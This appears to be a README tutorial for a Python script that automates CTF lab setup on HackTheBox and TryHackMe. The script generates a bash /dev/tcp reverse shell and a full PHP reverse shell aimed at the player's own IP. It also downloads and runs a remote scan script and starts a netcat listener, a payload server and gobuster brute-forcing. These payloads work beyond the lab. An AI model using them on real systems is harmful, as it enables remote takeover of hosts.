### See how it looks like
preview link: 
<br>
# HOW TO CREATE YOUR OWN AUTOMATION SCRIPT 

## In Tamil language

If you can understand Tamil language then watch this video 👇 <br>
Tutorial Video link: https://youtu.be/C9EAKWY37cQ <br>
I explained every step clearly here <br>

## In English language 👇
#### AUTOMATE CTFS
Here we're going to automate some tasks that we do when playing CTFs (Specially for HackTheBox and TryHackMe)
<br>
### Our plan
```bash
1)  Finding the tun0 IP of our machine
2)  Creating bash and php-rev-shell payloads for that IP
3)  Checking the Machine IP is in live or not
4)  If it's live then opening it in a web browser
5)  Running port scan
6)  Directory Brute-forcing
7)  Opening required terminals
8)  Starting a python server to send payload files
9)  Starting a netcat to get shell
10) Opening Metasploit
11) Save-time.txt
```
So this is our plan, we're going to automate these tasks. Let's go step by step
<br>
### Importing required modules
```python
from os import system as cmd
from time import sleep
import pyautogui as py
import subprocess
import re
import webbrowser 
```
<br>
We need Machine IP to use it in future tasks, so let's assign it here

```python
MACHINE_IP = "10.10.10.230"
```
<br>

#### Finding the tun0 IP of our machine
```python
with open('ip.txt','w') as f:
        ip = subprocess.run(['ip', 'a'],stdout=f,text=True)
```

Here we're running ```ip a``` command and redirecting the ```stdout```  to `f` . So, We can save the result in *"ip.txt"* file
<br>

#### Seperating tun0 IP from *"ip.txt"*
```python
txt_file = open('ip.txt','r')
IP = txt_file.read()
pattern = re.compile("[10]+\.+[10]+\.+\d\d+\.+\w{2,3}")
search_tun0 = pattern.findall(IP)
tun0_IP = search_tun0[0]
print("TUN0 IP FOUND:",tun0_IP)
```
Here we opened *"ip.txt"* file and searching a specific pattern in it

#### generating bash revshell and php-rev-shell payloads
##### bash rev shell
```python
port = "9001"
rev_shell = "bash -c 'bash -i >& /dev/tcp/"+tun0_IP+"/"+port+" 0>&1\'"
shell_txt = open('shell.sh','w')
shell_txt.write(rev_shell)
shell_txt.close()
cmd('echo " " >> shell.sh') # to avoid that '#' char in last part of code
```
creating *"shell.sh"* file and writing bash-rev-shell payload in it

##### php rev shell
```python
rev_txt = open('php-rev-shell.php','w')
```
creating *"php-rev-shell.php"* file and writing php-rev-shell payload in it

```python
rev_txt.write('''<?php
set_time_limit (0);
$VERSION = "1.0";
$ip = "'''+ tun0_IP + '''\";
$port = 1234;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
if (function_exists('pcntl_fork')) {
        // Fork and have the parent process exit
        $pid = pcntl_fork();
        if ($pid == -1) {
                printit("ERROR: Can't fork");
                exit(1);
        }
        if ($pid) {
                exit(0);  // Parent exits
        }
        if (posix_setsid() == -1) {
                printit("Error: Can't setsid()");
                exit(1);
        }
        $daemon = 1;
} else {
        printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}
chdir("/");
umask(0);
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
        printit("$errstr ($errno)");
        exit(1);
}
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);
$process = proc_open($shell, $descriptorspec, $pipes);
if (!is_resource($process)) {
        printit("ERROR: Can't spawn shell");
        exit(1);
}
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);
printit("Successfully opened reverse shell to $ip:$port");
while (1) {
        if (feof($sock)) {
                printit("ERROR: Shell connection terminated");
                break;
        }
        if (feof($pipes[1])) {
                printit("ERROR: Shell process terminated");
                break;
        }
        $read_a = array($sock, $pipes[1], $pipes[2]);
        $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
        if (in_array($sock, $read_a)) {
                if ($debug) printit("SOCK READ");
                $input = fread($sock, $chunk_size);
                if ($debug) printit("SOCK: $input");
                fwrite($pipes[0], $input);
        }
        if (in_array($pipes[1], $read_a)) {
                if ($debug) printit("STDOUT READ");
                $input = fread($pipes[1], $chunk_size);
                if ($debug) printit("STDOUT: $input");
                fwrite($sock, $input);
        }
        if (in_array($pipes[2], $read_a)) {
                if ($debug) printit("STDERR READ");
                $input = fread($pipes[2], $chunk_size);
                if ($debug) printit("STDERR: $input");
                fwrite($sock, $input);
        }
}
fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
        if (!$daemon) {
                print "$string\n";
        }
}
?>
''')
rev_txt.close()
print("\nPHP and BASH Rev Shell Files Created SUCESSFULLY")
```

#### Checking whether the IP is live or not
```python
print("\nChecking whether the IP is live or not")
cmd("echo 'ping -w 3 '"+MACHINE_IP+" > cmd.sh")
with open('ping.txt','w') as ping:
        png = subprocess.run(['bash','cmd.sh'],stdout=ping,text=True)
ping = open('ping.txt','r')
ping_txt = ping.read()
print
if "100% packet loss" in ping_txt or "Host Unreachable" in ping_txt:
        print("CHECK YOUR OVPN CONNECTION\nIP IS NOT REACHABLE :/")
        exit()
print("\nTHE IP",MACHINE_IP,"IS LIVE")
```
This part will check whether the Machine IP is in live or not, If it's offline or not reachable then the script will stops 

#### creating htbs scan file
```python
cmd('curl https://raw.githubusercontent.com/jopraveen/htbscan/main/htbs.py -o htbs.py')
```
I've created a small script to make the port scan faster. So here we're downloading it <br>
To know more about this script, watch this video: https://youtu.be/1Va6ws_o5w4

#### save time.txt
```python
save_time_txt = open('save-time.txt','w')
save_time_txt.write('''
curl http://'''+tun0_IP+''':8080/php-rev-shell.php'''
+'''

'''+
rev_shell+'''

DEFAULT CREDS FOR LOGIN PAGE:

username: jopraveen
mail    : jopraveen@machine.htb
password: testtest
''')
save_time_txt.close()
```
Here we're going to save our time by using this file... we can copy this when it's needed

#### removing unwanted files and arranging payloads in a folder
```python
cmd('rm ip.txt ping.txt cmd.sh')
cmd('mkdir www && mv save-time.txt php-rev-shell.php shell.sh www/')
```

#### opening IP in web browser
```python
webbrowser.open_new("http://"+MACHINE_IP)
sleep(2)
```

## Important part
The above things in the script are similar to everyone, but hereafter you need to create your own script... It's not same for everyone :/ <br>
I'll so you some examples to make it easier

### Switching application
Just now we opened a browser, We need to switch back to terminal to run next tasks <br>
So find your hot key to switch between apps, Mine is ```ALT + TAB``` I hope this is also similar to most of the people

```python
py.hotkey('ALT','TAB')
sleep(4)
```
Ok now we done this, make sure you changed the hot key in the above script

### Running port scan
```python
py.write('python3 htbs.py '+ MACHINE_IP[-3:])
py.hotkey('ENTER')
```
Now here we're running our fastest port scan script, It requires the last 3 digits of Machine IP as an argument to run the scan. So, I added `MACHINE_IP[-3:]` here <br>
And finally we need to press `ENTER` key to run this command

### Spliting terminal vertically
We need to split our terminal and need to do directory bruteforceing there

```python
py.hotkey('CTRL','SHIFT','RIGHT')
```
My Hot key for splitting terminal vertically is `CTRL + SHIFT + T` Change your's there

#### Going to that terminal
```python
py.hotkey('ALT','RIGHT')
sleep(2)
```
If we press `ALT + TAB` then we can go to that splited terminal and we can type commands there and run it <br>
Change this if it's not same for you

### Directory Brute Forcing
Here I'm using gobuster to brute-force the directories <br>
Change it if you use other tools also change your wordlist path too

```python
py.write("gobuster dir -u http://"+MACHINE_IP+"/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt")
py.hotkey('ENTER')
```
Now this will start the gobuster

### opening required terminals
Now I'm going to open a new tab with 4 terminals <br>
See how we can do this

![1](https://github.com/jopraveen/jopraveen/blob/main/some-gifs/CTF-AUTOMATION-1.png)

Here this is the hot key to open a new tab `CRTL + SHIFT + T` <br> ok now let's see how to open it with 4 terminals

![2](https://github.com/jopraveen/jopraveen/blob/main/some-gifs/CTF-AUTOMATION-2.jpg)

Go to your terminals settings and change this to 4 terminals

![3](https://github.com/jopraveen/jopraveen/blob/main/some-gifs/CTF-AUTOMATION-3.png)

Now you'll get beautiful terminals like this :) <br>

### Starting a netcat listener and a python server
```python
py.hotkey('ALT','RIGHT')
py.hotkey('CTRL','SHIFT','DOWN')
py.write('nc -lvvnp 9005')
py.hotkey('ENTER')
```
Now I'm  moving to the right terminal by pressing `ALT + TAB` and splitting the terminal vertically by pressing `CTRL + SHIFT + DOWN` <br> and starting a netcat listener

#### see how it looks like
![4](https://github.com/jopraveen/jopraveen/blob/main/some-gifs/CTF-AUTOMATION-4.gif)

I hope now you'll get an idea of what's happening here

#### Now python server
```python
py.hotkey('ALT','UP')
py.write('cd /home/kali/auto-ctf/www')
py.hotkey('ENTER')
py.write('python3 -m http.server 8080')
py.hotkey('ENTER')
```
Ok now we're moving upwards and going to our folder (our payloads folder) and starting a python server there

#### Opening Save-time.txt
```python
py.hotkey('ALT','DOWN')
py.hotkey('ALT','DOWN')
py.write('cd /home/kali/auto-ctf/www')
py.hotkey('ENTER')
py.write('cat save-time.txt')
py.hotkey('ENTER')
```
Moving to the bottom last terminal and opeing our save-time.txt file

### Opening Metasploit
```python
py.hotkey('ALT','LEFT')
py.write('msfconsole')
py.hotkey('ENTER')
```
Moving to left terminal and starting metasploit there

### All Done
```python
py.hotkey('ALT','UP')
py.write('figlet "LET\'S GO" | lolcat -a -d 3')
py.hotkey('ENTER')
```
Ok now we completed All the tasks, So printing "Let's Go" <br><br>

Make sure you changed all these stuffs, Then you can run this on your machine <br>
If you have any issues, Kindly post it in the issues page. <br>
I hope it's helpful to many peoples who do CTFs and It saves your valuable time
<br> Thankyou :)
